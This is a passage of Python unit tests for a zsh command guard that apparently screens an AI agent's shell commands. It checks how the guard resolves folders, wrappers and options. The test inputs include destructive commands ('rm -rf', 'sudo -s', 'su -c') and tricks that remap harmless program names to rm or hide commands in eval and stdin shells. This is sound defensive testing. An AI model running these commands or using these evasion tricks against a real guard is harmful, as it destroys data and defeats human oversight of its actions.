            self.assertEqual(self.ok(cmd).commands[-1].prog, "rm", cmd)


class Review1(GuardCase):
    """Implementation review round 1: when unsure, the value is dynamic/unknown."""

    def setUp(self):
        super().setUp()
        for d in ("x", "a/b", "b", "t/inner"):
            self.mk(d)
        os.symlink(os.path.join(self.root, "t", "inner"), os.path.join(self.root, "link"))
        self.R = lambda *p: os.path.join(self.root, *p)

    def test_zsh_modifiers_and_flags(self):  # MJ-1
        for cmd in ("X=/a/b.c; rm $X:h", "X=/a/b.c; rm $X:s/a/z/", 'X=/a/b.c; rm "$X:u"', "X=/a; rm $X:t:r",
                    "X=a; rm $=X", "X=a; rm $~X", "X=a; rm $^X", "X=a; rm $+X", "X=a; rm ${=X}", "X=a; rm $==X"):
            self.assertIsNone(self.one(self.ok(cmd), "rm").argv[1], cmd)
        self.assertEqual(self.one(self.ok("X=/a; rm ${X}:h"), "rm").argv[1], "/a:h")
        self.assertEqual(self.one(self.ok("X=/a; rm $X:/b"), "rm").argv[1], "/a:/b")  # ':' + '/' is no modifier

    def test_tilde_plus_minus(self):  # MJ-1
        self.assertEqual(self.one(self.ok("ls ~+ ~+/q"), "ls").argv[1:], [self.root, self.root + "/q"])
        r = self.ok("cd ~+/x; touch y")
        self.assertEqual(self.one(r, "touch").cwds, [self.R("x")])
        self.assertEqual(self.one(self.ok("cd x; ls ~-"), "ls").argv[1], self.root)
        self.assertEqual(self.one(self.ok("ls ~-"), "ls").argv[1], self.root)  # review 10: the start folder
        self.assertIsNone(self.one(self.ok("ls ~+2"), "ls").argv[1])
        r = self.ok("for d in a; do cd $d; done; ls ~+")
        self.assertIsNone(self.one(r, "ls").argv[1])

    def test_eval_makes_cwd_unknown(self):  # MJ-2
        r = self.ok("eval 'cd x'; touch y")
        self.assertEqual(self.one(r, "touch").cwds, [])
        self.assertIn("env-unknown", self.one(r, "touch").flags)
        r = self.ok("emulate sh -c 'rm studio/a'; touch y")
        self.assertEqual(self.kinds(r), ["eval"])
        self.assertEqual([h.term for h in r.opaque[0].hits], ["studio"])
        self.assertEqual(self.one(r, "touch").cwds, [])

    def test_anonymous_functions(self):  # MJ-2
        for cmd in ("function { rm a }", "function () { rm a; }", "() { rm a }", "() rm a"):
            r = self.scan(cmd)
            self.assertEqual((r.status, r.reason.split("@")[0]), ("unparsable", "unsupported:zsh-anon-function"), cmd)

    def test_cd_prefix_cdpath(self):  # MJ-3
        for cmd in ("CDPATH=/x cd b; touch y", "cdpath=/x cd ./b; touch y", "CDPATH=/x pushd b; touch y"):
            self.assertEqual(self.one(self.ok(cmd), "touch").cwds, [], cmd)

    def test_cd_physical(self):  # MJ-3
        real_t = os.path.realpath(self.R("t"))
        self.assertEqual(self.one(self.ok("cd -P link/..; touch y"), "touch").cwds, [real_t])
        self.assertEqual(self.one(self.ok("cd -LP link/..; touch y"), "touch").cwds, [real_t])
        self.assertEqual(self.one(self.ok("setopt chaselinks; cd link/..; touch y"), "touch").cwds, [real_t])
        self.assertEqual(self.one(self.ok("set -o chaselinks; cd link/..; touch y"), "touch").cwds, [real_t])
        self.assertEqual(self.one(self.ok("cd link/..; touch y"), "touch").cwds, [self.root])
        self.assertEqual(self.one(self.ok("emulate zsh; cd link/..; touch y"), "touch").cwds, [])
        from guard_base import snapshot_text
        self.use_snapshots(snapshot_text(options=("chaselinks",), path=self.bin), snapshot_text(path=self.bin))
        self.assertEqual(self.one(self.ok("cd link/..; touch y"), "touch").cwds, [])

    def test_options_changing_words(self):  # MINOR 1
        for cmd in ("setopt shwordsplit; X=a; rm $X", "unsetopt shwordsplit; X=a; rm $X", "setopt SH_WORD_SPLIT; X=a; rm $X",
                    "set -o globsubst; X=a; rm $X", "setopt rcexpandparam; X=a; rm $X", "emulate sh; X=a; rm $X",
                    "setopt $opt; X=a; rm $X"):
            self.assertIsNone(self.one(self.ok(cmd), "rm").argv[1], cmd)
        self.assertEqual(self.one(self.ok('setopt shwordsplit; X=a; rm "$X"'), "rm").argv[1], "a")
        # a known brace option is applied (review 3 R1): IGNORE_BRACES keeps the braces, BRACE_CCL expands `{d}`
        self.assertEqual(self.one(self.ok("setopt ignorebraces; rm {a,b}"), "rm").argv[1], "{a,b}")
        self.assertEqual(self.one(self.ok("setopt braceccl; rm stu{d}io"), "rm").argv[1], "studio")
        self.assertEqual(self.one(self.ok("rm {s..s}tudio"), "rm").argv[1], "studio")
        self.assertEqual(self.one(self.ok("rm studi{o..o}"), "rm").argv[1:], ["studio"])
        self.assertEqual(self.one(self.ok("rm {r..t}x"), "rm").argv[1:], ["rx", "sx", "tx"])
        self.assertIsNone(self.one(self.ok("setopt $opt; rm {a,b}"), "rm").argv[1])
        self.assertEqual(self.one(self.ok("setopt autopushd; X=a; rm $X"), "rm").argv[1], "a")

    def test_disable_cd(self):  # NIT
        r = self.ok("disable cd; cd x; touch y")
        self.assertEqual(self.one(r, "touch").cwds, [])

    def test_exec_by_program_marker(self):  # MINOR 4 (G20)
        os.makedirs(self.R(".git"))
        self.mk(".claude", "studio", "scripts", "lock.py", file=True)
        r = self.ok("env rm a; xargs rm; python3 .claude/studio/scripts/lock.py run --kind tts -- rm b; "
                    "find . -exec rm {} +; rm c")
        flags = {tuple(c.argv): "exec-by-program" in c.flags for c in self.by_prog(r, "rm")}
        self.assertEqual(flags[("rm", "a")], True)
        self.assertEqual(flags[("rm", "b")], True)
        self.assertEqual(flags[("rm", "c")], False)
        self.assertTrue(all(v for k, v in flags.items() if None in k))


class Review2(GuardCase):
    def setUp(self):
        super().setUp()
        self.mk("a")
        self.mk("b")

    def test_failing_move_leaves_stack_unknown(self):  # MINOR 1
        # review 10 conf m-2: a move that may fail pushes or not — popd is judged on each stack the shell may have;
        # a push from one of several folders leaves the stack unknown
        self.assertEqual(self.one(self.ok("pushd x; pushd b; popd; touch c"), "touch").cwds, [])
        self.assertEqual(sorted(self.one(self.ok("pushd x; popd; touch c"), "touch").cwds),
                         sorted([self.root, os.path.join(self.root, "x")]))
        from guard_base import snapshot_text
        self.use_snapshots(snapshot_text())  # AUTO_PUSHD on
        self.assertEqual(self.one(self.ok("cd nope; cd a; popd; touch c"), "touch").cwds, [])
        self.assertEqual(self.one(self.ok("cd a; cd ../b; popd; touch c"), "touch").cwds,
                         [os.path.join(self.root, "a")])

    def test_function_options_leak(self):  # MINOR 2
        r = self.ok("f() { setopt shwordsplit }; f; X='a b'; rm $X")
        self.assertIsNone([c for c in self.by_prog(r, "rm")][-1].argv[1])
        for body in ("unsetopt shwordsplit", "emulate sh", "set -o globsubst"):
            r = self.ok("f() { %s; }; f; X=a; rm $X" % body)
            self.assertIsNone(self.by_prog(r, "rm")[-1].argv[1], body)
        for body in ("emulate -L zsh; setopt shwordsplit", "setopt localoptions shwordsplit"):
            r = self.ok("f() { %s; }; f; X=a; rm $X" % body)
            self.assertEqual(self.by_prog(r, "rm")[-1].argv[1], "a", body)
        r = self.ok("f() { setopt shwordsplit }; X=a; rm $X")  # defined, never called
        self.assertEqual(self.by_prog(r, "rm")[-1].argv[1], "a")


class G1Walk(GuardCase):
    """guard-runners-plan §1.2–§1.5: wrappers with their files and run folders, refused runners, shell payloads,
    precommands, `command cd`, program names in capitals."""

    def setUp(self):
        super().setUp()
        for d in ("a", "sub"):
            self.mk(d)
        self.R = lambda *p: os.path.join(self.root, *p)

    def test_wrapper_names_and_files(self):
        c = self.one(self.ok("/usr/bin/time -o t.txt nice -n 5 flock lk rm x"), "rm")
        self.assertEqual([w.name for w in c.wrappers], ["time", "nice", "flock"])
        self.assertEqual([(w.value, op) for w, op in c.wrappers[0].files], [("t.txt", "write")])
        self.assertEqual([(w.value, op) for w, op in c.wrappers[2].files], [("lk", "write")])
        self.assertEqual(c.argv, ["rm", "x"])
        c = self.one(self.ok("busybox.static env rm x"), "rm")
        self.assertEqual([w.name for w in c.wrappers], ["busybox", "env"])

    def test_wrapper_cwd(self):
        c = self.one(self.ok("env -C a /usr/bin/time -o t ls"), "ls")
        self.assertEqual([w.name for w in c.wrappers], ["env", "time"])
        self.assertEqual(c.wrappers[1].cwd, [self.R("a")])
        self.assertEqual(c.wrappers[0].cwd, [self.root])
        self.assertEqual(c.run_cwds, [self.R("a")])
        c = self.one(self.ok("sudo -D sub env -C ../a ls"), "ls")
        self.assertEqual(c.run_cwds, [self.R("a")])
        c = self.one(self.ok("env -C $X ls"), "ls")
        self.assertEqual(c.run_cwds, [])

    def test_no_command_files(self):
        c = self.one(self.ok("sudo -e a.txt b.txt"), "sudo")
        self.assertEqual([(w.value, op) for w, op in c.files], [("a.txt", "write"), ("b.txt", "write")])
        self.assertEqual(c.wrappers, [])

    def test_refused_runner(self):
        for cmd, prog in (("su -c 'rm x'", "su"), ("BUILTIN rm x", "BUILTIN"), ("nohup -x rm x", "nohup"),
                          ("timeout --sig KILL 5 rm x", "timeout"), ("xargs --max-lines 1 rm", "xargs"),
                          ("npx --weird rimraf x", "npx"), ("exec -z rm x", "exec"),
                          (" ".join(["nice"] * 17) + " rm x", "nice")):
            r = self.ok(cmd)
            c = [c for c in r.commands if c.prog == prog][-1]
            self.assertIn("runner-unread", c.flags, cmd)
            self.assertIn("runner", self.kinds(r), cmd)
            self.assertEqual(self.by_prog(r, "rm"), [], cmd)
        r = self.ok("su -c 'rm -rf /x/studio'")
        self.assertIn("/x/studio", [o for o in r.opaque if o.kind == "runner"][0].skeleton)

    def test_shell_payloads(self):
        for cmd, prog, text in (("watch -n 1 'rm x'", "watch", "rm x"), ("flock lk -c 'rm x'", "flock", "rm x"),
                                ("script -c 'rm x' log", "script", "rm x"), ("npx -c 'rm x'", "npx", "rm x"),
                                ("yarn exec rm x", "yarn", "rm x")):
            r = self.ok(cmd)
            ops = [o for o in r.opaque if o.kind != "unknown-command"]  # flock is not on the test PATH
            self.assertEqual([(o.kind, o.payload) for o in ops], [("shell-c", text)], cmd)
            self.assertEqual(self.one(r, prog).id, ops[0].cmd, cmd)
        r = self.ok("watch -n 1 rm $X")  # two readings (§3): `$X` dropped, and kept
        self.assertEqual(sorted((o.payload or "", o.origin, o.skeleton) for o in r.opaque),
                         [("", "dynamic", "rm \0"), ("rm", "literal", "rm")])
        self.assertEqual(self.kinds(self.ok("watch \"rm $X\"")), ["runner"])  # a dynamic word where an option may stand
        c = self.one(self.ok("script -q /dev/null rm x"), "rm")
        self.assertEqual([w.name for w in c.wrappers], ["script"])

    def test_command_cd(self):
        # zsh without POSIX_BUILTINS: `command cd` is the external cd (the shell's folder stays)
        self.assertEqual(self.one(self.ok("command cd sub; touch y"), "touch").cwds, [self.root])
        self.assertEqual(self.one(self.ok("/usr/bin/command cd sub; touch y"), "touch").cwds, [self.root])
        self.assertEqual(self.one(self.ok("builtin cd sub; touch y"), "touch").cwds, [self.R("sub")])
        self.assertEqual(self.one(self.ok("setopt posixbuiltins; command cd sub; touch y"), "touch").cwds,
                         [self.R("sub")])
        self.assertEqual(self.one(self.ok("setopt $O; command cd sub; touch y"), "touch").cwds, [])  # chaselinks too
        # options[…] is a write to zsh's option table (§1.8): every option may have changed, chaselinks too
        self.assertEqual(self.one(self.ok("options[posixbuiltins]=on; command cd sub; touch y"), "touch").cwds, [])
        r = self.ok("emulate sh -c 'command cd sub'")
        self.assertEqual(r.opaque[0].options, {"posixbuiltins": True})
        c = self.one(self.ok("command -v git"), "command")
        self.assertIn("query", c.flags)

    def test_name_folded(self):
        from stdo.guard.where import FS, Where
        if not Where(FS(), self.env).case_insensitive(self.bin):
            self.skipTest("the test folder is on a case-sensitive volume")
        self.exe("cd")  # an external cd (macOS has /usr/bin/cd)
        c = self.one(self.ok("RM -rf x"), "rm")
        self.assertIn("name-folded", c.flags)
        self.assertEqual((c.words[0].value, c.words[0].raw), ("rm", "RM"))
        c = self.one(self.ok("%s/RM x" % self.bin), "rm")
        self.assertEqual(c.words[0].value, "%s/rm" % self.bin)
        c = self.one(self.ok("ENV NOHUP Nice rm x"), "rm")
        self.assertEqual([w.name for w in c.wrappers], ["env", "nohup", "nice"])
        r = self.ok("CD sub; touch y")
        self.assertIn("name-folded", self.one(r, "cd").flags)
        self.assertEqual(self.one(r, "touch").cwds, [self.root])  # a folded name never takes the builtin path
        r = self.ok("NOSUCHPROGRAM x")
        self.assertNotIn("name-folded", r.commands[0].flags)


class G1Words(GuardCase):
    """guard-runners-plan §3 (empty words, readings, argv-unknown) and §1.8 (zsh's tables, (e), prompts, csh)."""

    def gits(self, cmd):
        return self.by_prog(self.ok(cmd), "git")

    def test_dropped_empty_word(self):
        gits = self.gits("X=; git $X status")
        self.assertEqual(sorted(tuple(c.argv) for c in gits), [("git", "", "status"), ("git", "status")])
        self.assertEqual([c.alt for c in gits], [None, {"group": "maybe-empty", "index": "kept"}])
        for cmd in ("X=; git ${X} status", "X=; git $X$X status", "X=; Y=$X; git $Y status"):
            self.assertEqual(sorted(len(c.argv) for c in self.gits(cmd)), [2, 3], cmd)
        for cmd in ('X=; git "$X" status', "X=; git ''$X status", 'git "" status', "X=; git \"\"$X status"):
            self.assertEqual([len(c.argv) for c in self.gits(cmd)], [3], cmd)  # a quoted empty word stays
        # a program whose words keep their meaning: the no-drop reading only
        self.assertEqual(self.one(self.ok("X=; ls $X src"), "ls").argv, ["ls", "src"])

    def test_maybe_empty_readings(self):
        gits = self.gits("git $A status")
        self.assertEqual([c.argv for c in gits], [["git", "status"], ["git", None, "status"]])
        self.assertEqual([c.alt for c in gits], [{"group": "maybe-empty", "index": 1}, None])
        for n, cmd in ((1, "git status"), (2, "git $A status"), (4, "git $A -x $(x) status"),
                       (8, "git $A -x ${B:-} -y $C[1] status")):
            gits = self.gits(cmd)
            self.assertEqual(len(gits), n, cmd)
            self.assertFalse(any("argv-unknown" in c.flags for c in gits), cmd)
        self.assertEqual(self.gits("git $A $B status")[0].argv, ["git", "status"])  # the most dropped first
        for cmd in ("git $A $B $C $D status", "git $@ status", "git ${=X} status", "git $=X status",
                    "git ${(s:,:)X} status", 'git "$@" status', "git $arr[@] status", 'git "${arr[@]}" status',
                    "X='*'; git ${~X} status", "setopt globsubst; git $X status"):
            gits = self.gits(cmd)
            self.assertEqual(len(gits), 1, cmd)
            self.assertIn("argv-unknown", gits[0].flags, cmd)
        for cmd in ("rm -rf $A x", "rm $@ x", "touch $1 $2 $3 $4 x", "ls $A", "cd $A"):
            c = self.ok(cmd).commands[0]
            self.assertNotIn("argv-unknown", c.flags, cmd)
            self.assertEqual(len(self.ok(cmd).commands), 1, cmd)
        # words that are never empty
        for cmd in ("git x$A status", 'git "$A" status', "git $((1)) status", "git ~ status"):
            self.assertEqual(len(self.gits(cmd)), 1, cmd)

    def test_option_value_reading_skipped(self):
        # §1.2: the reading where the shell drops -n's value makes nice refuse `-rf` — nice fails the same way
        r = self.ok("nice -n $A $B rm -rf x")
        self.assertEqual([c.argv for c in self.by_prog(r, "rm")], [["rm", "-rf", "x"]])  # {A} and {B}: one command
        self.assertEqual(self.kinds(r).count("runner"), 1)  # the no-drop reading: $B where an option may stand
        r = self.ok("X=; timeout $X 5 rm -rf x")
        self.assertEqual([c.argv for c in self.by_prog(r, "rm")], [["rm", "-rf", "x"]])

    def test_no_drop_outside_argv(self):
        for cmd in ('X=; [[ $X == "" ]] && echo e', "X=; (( ${#X} == 0 ))", "X=; Y=$X; echo $Y",
                    'X=; case $X in "") echo e;; esac', "X=; cat <<< $X", "X=; for f in $X; do echo $f; done",
                    "X=; echo x > out$X.txt"):
            self.ok(cmd)
        r = self.ok("X=; cat <<< $X")
        self.assertEqual(self.one(r, "cat").redirs[0].body, "\n")

    def test_split_substitution_value(self):
        d = self.mk("a b")
        for cmd in ("touch $(pwd)", "touch $(pwd)/x"):
            c = self.one(self.ok(cmd, cwd=d), "touch")
            self.assertIsNone(c.argv[1], cmd)  # unquoted, with a blank: the shell splits it
        c = self.one(self.ok('touch "$(pwd)"', cwd=d), "touch")
        self.assertEqual(c.argv[1], d)

    def test_tables_set_shadowed(self):
        for cmd in ("hash ls=/bin/rm; ls x", "hash -p /bin/rm ls; ls x", "commands[ls]=/bin/rm; ls x",
                    "functions[ls]='rm x'; ls", "typeset 'commands[ls]=/bin/rm'; ls x",
                    "x=ls; commands[$x]=/bin/rm; ls x", "read -r 'commands[ls]' <<< /bin/rm; ls x",
                    "print -v 'commands[ls]' /bin/rm; ls x", "set -A aliases ls rm; ls x",
                    ": ${commands[ls]::=/bin/rm}; ls x", "n='commands[ls]'; : ${(P)n::=/bin/rm}; ls x",
                    "fpath=(/tmp/f $fpath); ls x", "options[posixbuiltins]=on; ls x",
                    "zstyle -s ':x' k 'commands[ls]'; ls x", "zmodload zsh/stat; zstat -A commands x; ls x"):
            r = self.ok(cmd)
            self.assertIn("zsh-table", self.kinds(r), cmd)
            self.assertIn("shadowed", self.by_prog(r, "ls")[-1].flags, cmd)
        for cmd in ("echo ${+commands}", "echo ${commands[ls]}", "ls functions", "grep -rn options src",
                    "echo $options", "stat functions", "print -r commands", "hash -r"):
            self.assertNotIn("zsh-table", self.kinds(self.ok(cmd)), cmd)
        # hash -d: ~name is no longer resolved
        self.mk("d")
        r = self.ok("x=%s; ls ~x; hash -d y=/tmp; ls ~x" % self.root)
        self.assertEqual([c.argv[1] for c in self.by_prog(r, "ls")], [self.root, None])

    def test_eval_and_prompt_forms(self):
        self.assertIn("dynamic-command", self.kinds(self.ok("echo ${(e)X}")))
        self.assertIn("dynamic-command", self.kinds(self.ok("echo \"${(e):-x}\"")))
        self.assertEqual(self.kinds(self.ok("print -P '%F{red}x%f'")), [])  # PROMPT_SUBST off
        self.assertIn("prompt-subst", self.kinds(self.ok("setopt promptsubst; print -P x")))
        self.assertIn("prompt-subst", self.kinds(self.ok("setopt prompt_subst; echo ${(%):-x}")))
        self.assertIn("prompt-subst", self.kinds(self.ok("setopt promptsubst; PS4='$(x)'")))

    def test_csh_strings(self):
        self.exe("csh")
        r = self.ok("csh -c 'rm -rf x'")
        self.assertEqual([(o.kind, o.payload) for o in r.opaque], [("shell-c", "rm -rf x")])

    def test_extendedglob_operators(self):
        c = self.one(self.ok("touch ^x.json"), "touch")
        self.assertFalse(c.words[1].glob)
        c = self.by_prog(self.ok("setopt extendedglob; touch ^x.json"), "touch")[-1]
        self.assertTrue(c.words[1].glob)


class G1Fixes(GuardCase):
    """G1 implementation review 1: run folders (M1, M3), readings refused for another cause (M4), §1.9 variables
    written by other routes (M6), arrays (C-M3), nested (e) flags (M12), sudo -s skeletons (m2)."""

    def setUp(self):
        super().setUp()
        for d in ("a", "sub"):
            self.mk(d)
        self.R = lambda *p: os.path.join(self.root, *p)

    def test_last_run_folder(self):  # M1: env -C / sudo -D given twice: the last one is the folder
        for cmd in ("env -C sub -C a ls", "env --chdir=sub --chdir=a ls", "sudo -D sub -D a ls"):
            self.assertEqual(self.one(self.ok(cmd), "ls").run_cwds, [self.R("a")], cmd)
        self.assertEqual(self.one(self.ok("env -C sub env -C ../a ls"), "ls").run_cwds, [self.R("a")])

    def test_unknown_run_folder(self):  # M3: a run folder the guard cannot read is unknown, not the shell's
        for cmd in ("env -C $D ls", "sudo -D $D ls", "env -C a -C $D ls"):
            c = self.one(self.ok(cmd), "ls")
            self.assertIn("run-unknown", c.flags, cmd)
            self.assertEqual([w.raw for w in c.run_words], ["$D"], cmd)
        c = self.one(self.ok("env -C $D env -C /tmp ls"), "ls")
        self.assertNotIn("run-unknown", c.flags)
        self.assertNotIn("run-unknown", self.one(self.ok("env -C a ls"), "ls").flags)

    def test_dropped_value_cause(self):  # M4: skipped only when the runner rejects the shifted word
        r = self.ok("X=; timeout -s $X KILL --sig KILL 5 rm x")
        self.assertIn("runner", self.kinds(r))  # --sig is refused whether or not -s took KILL
        r = self.ok("nice -n $A $B rm -rf x")
        self.assertEqual(self.kinds(r).count("runner"), 1)  # `nice -n rm`: nice rejects `rm` as a number
        r = self.ok("X=; timeout -k $X 5 rm x")  # `-k 5`: a valid value, then `rm` the duration: no command runs
        self.assertNotIn("runner", self.kinds(r))

    def test_variables_written_by_name(self):  # M6
        for cmd in ("read GIT_EDITOR <<< x", "for GIT_EDITOR in x; do :; done", "select GIT_EDITOR in x; do :; done",
                    "print -v GIT_EDITOR x", "printf -v GIT_EDITOR %s x", ": ${GIT_EDITOR::=x}", "GIT_EDITOR[1,-1]=x",
                    "set -A GIT_EDITOR x", "zformat -f GIT_EDITOR x", "vared GIT_EDITOR", "getopts x GIT_EDITOR",
                    "echo ${X:-${GIT_EDITOR:=x}}"):
            ops = [o for o in self.ok(cmd).opaque if o.kind == "var-set"]
            self.assertEqual([(o.payload, o.value) for o in ops], [("GIT_EDITOR", None)], cmd)
        c = self.one(self.ok("read HOME <<< /tmp/h; git status"), "git")
        self.assertIsNone(c.env.set["HOME"].value)
        for cmd in ("read -r line <<< x", "for f in a b; do :; done", "print -v out x"):
            self.assertEqual([o for o in self.ok(cmd).opaque if o.kind == "var-set"], [], cmd)

    def test_arrays_are_multi_word(self):  # C-M3
        for cmd in ("a=(x y); git add $a", "typeset -a a; git add $a", "set -A a x y; git add $a",
                    "git add $path"):
            self.assertIn("argv-unknown", self.by_prog(self.ok(cmd), "git")[-1].flags, cmd)
        for cmd in ('a=(x y); git add "$a"', "a=(x y); a=z; git add $a", "a=(x y); git add $a[1]"):
            self.assertNotIn("argv-unknown", self.by_prog(self.ok(cmd), "git")[-1].flags, cmd)

    def test_nested_eval_flags(self):  # M12
        for cmd in ("echo ${${(e)X}}", "echo ${Y:-${(e)X}}", "echo ${X:+${(e)X}}", "echo ${X//a/${(e)X}}",
                    "setopt extendedglob; echo ${X/(#m)*/${(e)MATCH}}"):
            self.assertIn("dynamic-command", self.kinds(self.ok(cmd)), cmd)
        for cmd in ("echo ${(s:e:)X}", "echo ${(j:e:)X}", "echo ${X:-e}"):
            self.assertNotIn("dynamic-command", self.kinds(self.ok(cmd)), cmd)

    def test_root_shell_skeleton(self):  # m2: searched for Studio repositories
        o = [o for o in self.ok("sudo -s 'rm -rf /x/studio'").opaque if o.kind == "sudo-shell"][0]
        self.assertEqual(o.skeleton, "rm -rf /x/studio")


class G1Review2(GuardCase):
    """G1 implementation review 2: wildcard folders (M12), templates and strings in a run folder (M1), array values
    (M8), pattern expansions (M13), tied parameters (M4), attached names (M3), stdin shells (m-b) and the effects of
    the snapshot's functions (R2-M1)."""

    def setUp(self):
        super().setUp()
        for d in ("a", "studio"):
            self.mk(d)
        self.R = lambda *p: os.path.join(self.root, *p)

    def test_wildcard_folders(self):  # M12
        for cmd in ("cd stu?io; touch x", "pushd s*; touch x", "cd **/a && touch x"):
            self.assertEqual(self.one(self.ok(cmd), "touch").cwds, [], cmd)
        for cmd in ("env -C stu?io touch x", "env --chdir=s* touch x", "sudo -D s* touch x"):
            c = self.one(self.ok(cmd), "touch")
            self.assertIn("run-unknown", c.flags, cmd)
            self.assertEqual(len(c.run_words), 1, cmd)
        c = self.one(self.ok("git -C stu?io status"), "git")
        self.assertEqual((c.git.c_dirs, "run-unknown" in c.flags), ([None], True))
        c = self.one(self.ok('git -C "" status'), "git")
        self.assertEqual((c.run_cwds, "run-unknown" in c.flags), ([self.root], False))
        self.assertIn("run-unknown", self.one(self.ok("tar -xf x.tar -C stu?io"), "tar").flags)
        self.assertEqual(self.one(self.ok("env -C a git -C studio status"), "git").run_cwds, [self.R("a", "studio")])

    def test_templates_and_strings_in_the_run_folder(self):  # M1
        r = self.ok("env -C $D find . -exec rm -rf x \\;")
        self.assertEqual(self.one(r, "rm").cwds, [])
        r = self.ok("env -C a xargs rm -rf < /dev/null")
        self.assertEqual(self.one(r, "rm").cwds, [self.R("a")])
        for cmd in ("env -C $D env -S 'rm x'", "env -C $D sudo -s 'rm x'"):
            c = [c for c in self.ok(cmd).commands if "run-unknown" in c.flags]
            self.assertEqual(len(c), 1, cmd)

    def test_array_values(self):  # M8
        for cmd in ("a=($(rm -rf x))", "a=(`rm -rf x`)", "a+=(b $(rm -rf x))", "typeset -a a=($(rm -rf x))"):
            self.assertEqual(len(self.by_prog(self.ok(cmd), "rm")), 1, cmd)
        for cmd in ('a=("${(e)X}")', "a=(${(e)X})", "a=([k]=${(e)X})", "echo ${(s(x)e)X}"):
            self.assertIn("dynamic-command", self.kinds(self.ok(cmd)), cmd)
        self.assertNotIn("dynamic-command", self.kinds(self.ok("a=(x y); echo ${(j: :)a}")))

    def test_pattern_expansions(self):  # M13
        for cmd in ("X='a(e:rm x:)'; echo $~X", "X='a(+f)'; echo ${~X}", "X='a(e:rm x:)'; echo ${(~)X}",
                    "setopt globsubst; X='a(e:rm x:)'; echo $X", "echo $~UNSET", "echo ${~X:-a}"):
            self.assertIn("dynamic-command", self.kinds(self.ok(cmd)), cmd)
        for cmd in ("X='*.ts'; echo $~X", "X='a(e:rm x:)'; echo $X", "X='a(e:rm x:)'; echo \"$~X\""):
            self.assertNotIn("dynamic-command", self.kinds(self.ok(cmd)), cmd)

    def test_tied_parameters_and_attached_names(self):  # M4, M3
        for cmd in ("typeset -T GIT_EDITOR ge ' '", "typeset -Tx PAGER pg", "print -vGIT_EDITOR x",
                    "strftime -sGIT_EDITOR x 0", "zparseopts -AGIT_EDITOR a"):
            self.assertIn(("var-set", None), [(o.kind, getattr(o, "value", "?")) for o in self.ok(cmd).opaque], cmd)
        for cmd in ("typeset -T x commands", "print -v'commands[ls]' x", "set -Acommands ls", "set +Acommands",
                    "zparseopts -Acommands a"):
            self.assertIn("zsh-table", self.kinds(self.ok(cmd)), cmd)
        self.assertEqual(self.kinds(self.ok("typeset -T MYPATH mypath :")), [])

    def test_stdin_shells(self):  # m-b
        for cmd in ("sh /dev/stdin <<< 'rm x'", "bash /dev/fd/0 <<< 'rm x'"):
            o = [o for o in self.ok(cmd).opaque if o.kind == "herestring-interp"]
            self.assertEqual([x.payload for x in o], ["rm x\n"], cmd)
        o = [o for o in self.ok("sudo -E -s <<< 'rm /x/studio'").opaque if o.kind == "sudo-shell"][0]
        self.assertEqual(o.skeleton, "rm /x/studio\n")

    def test_snapshot_function_effects(self):  # R2-M1
        from stdo.guard import walk
        from stdo.guard.scanctx import ScanCtx
        funcs = '''wrap () {
	local label
	label=x
	command wrap "$@"
}
twice () {
	wrap "$@" && cd "$1"
}
pick () {
	if [[ $1 =~ ^(a|b)$ ]]
	then
		print a
	fi
}
exp () {
	export GIT_DIR=/x
}
calls () {
	exp
}
glob () {
	X=1
}
src () {
	. ./x.sh
}
opts () {
	setopt globsubst
}
lopts () {
	emulate -L zsh
	setopt globsubst
}
'''
        # review 3 (bypass m1, conf M-1 to M-3): assignment by name, `always`, a `local` on a branch, LOCAL_OPTIONS
        # turned off, letter options; folder changes; plain globals
        funcs += """byname () {
	: ${(P)1::=$2}
}
branchlocal () {
	if false
	then
		local PATH
	fi
	PATH=$1:$PATH
}
always_ () {
	local x
	{ HOME=$1 } always { : }
}
nolocal () {
	unsetopt localoptions
	setopt globsubst
}
nolocal2 () {
	setopt localoptions
	setopt nolocaloptions globsubst
}
maybelocal () {
	[[ -n $1 ]] && setopt localoptions
	setopt globsubst
}
lettery () {
	set -y
}
letter4 () {
	set -4
}
letterT () {
	set -T
}
lettereuo () {
	set -euo pipefail
}
letterr () {
	set -r
}
goes () {
	builtin cd "$1"
}
callsgoes () {
	goes "$@"
}
prompt_ () {
	PROMPT="%~ %# "
}
loader () {
	autoload -Uz compinit
	unfunction x
	alias ll='ls -l'
}
galias () {
	alias -g G='| grep'
}
loops () {
	local n=$1
	for i in a b
	do
		n=$i
	done
}
"""
        snap = self.use_snapshots(snapshot_text(functions=funcs))
        ctx = ScanCtx(self.env, guard.FS(), snapshot=snap)
        E = lambda n: walk.snapshot_function_effects(ctx, n)
        none = {"env": False, "globals": set(), "options": {}, "options_unknown": False, "local": "inherit",
                "cwd": False, "shadowed": set()}
        for n in ("wrap", "pick"):
            self.assertEqual(E(n), none, n)
        self.assertEqual(E("twice"), dict(none, cwd=True))
        self.assertEqual(E("lopts"), dict(none, options={"globsubst": True}, local=True))
        for n in ("exp", "calls"):
            self.assertTrue(E(n)["env"], n)
        self.assertEqual(E("glob")["globals"], {"X"})
        self.assertIsNone(E("src"))
        self.assertEqual(E("opts"), dict(none, options={"globsubst": True}))
        self.assertIsNone(E("nosuch"))
        self.assertIsNone(E("byname"))
        self.assertEqual(E("branchlocal")["globals"], {"PATH"})
        self.assertEqual(E("always_")["globals"], {"HOME"})  # `{ … } always { … }` is read (review 5 R1)
        self.assertEqual(E("nolocal")["local"], False)
        self.assertEqual(E("nolocal2")["local"], False)
        self.assertEqual((E("maybelocal")["local"], E("maybelocal")["options"]), (None, {"globsubst": True}))
        # review 10 conf M-1: `set` letters are read one by one; a letter the guard does not know is unknown
        self.assertEqual((E("lettery")["options"], E("lettery")["options_unknown"]), ({"shwordsplit": True}, False))
        self.assertEqual(E("letter4")["options"], {"globdots": True})
        self.assertEqual(E("letterT")["options"], {"cdablevars": True})
        self.assertEqual(E("lettereuo")["options"], {"pipefail": True})
        self.assertTrue(E("letterr")["options_unknown"])
        self.assertTrue(E("goes")["cwd"])
        self.assertTrue(E("callsgoes")["cwd"])
        self.assertEqual(E("prompt_"), dict(none, globals={"PROMPT"}))
        self.assertEqual(E("loops")["globals"], {"i"})
        self.assertEqual(E("loader")["shadowed"], {"compinit", "x", "ll"})
        self.assertIsNone(E("galias"))


class G1Review10(GuardCase):
    """G1 review 10: the union rule — a folder or value that may or may not change is one of the old or new ones."""

    def test_known_folders_kept(self):
        r = self.ok("cd $X; touch y")
        ts = [c for c in r.commands if c.prog == "touch"]
        self.assertEqual([c.cwds for c in ts], [[], [self.root]])  # unknown, and where a failed cd leaves it
        r = self.ok("trap 'cd /' ZERR; touch y")
        self.assertEqual([c.cwds for c in r.commands if c.prog == "touch"], [[], [self.root]])
